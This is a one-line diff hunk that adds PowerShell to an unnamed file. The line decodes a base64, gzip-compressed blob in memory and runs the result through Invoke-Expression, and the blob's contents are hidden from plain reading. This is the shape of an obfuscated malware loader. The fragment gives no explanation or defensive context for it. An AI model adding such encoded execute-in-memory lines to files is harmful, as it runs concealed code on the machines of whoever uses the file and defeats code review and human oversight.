@@ -1,0 +1,1 @@
+$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAKdjV2oC//N0jVDQ8Est1/VPykpNLlHwSy3RC09Ncs7JTM0r0dRzyS/Py8lPTAkuKcrMS9dQzygpKbDS10+vMtRNrUjMLchJ1StJLS7RT9QrKDZU1wQAbXjmr04AAAA='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
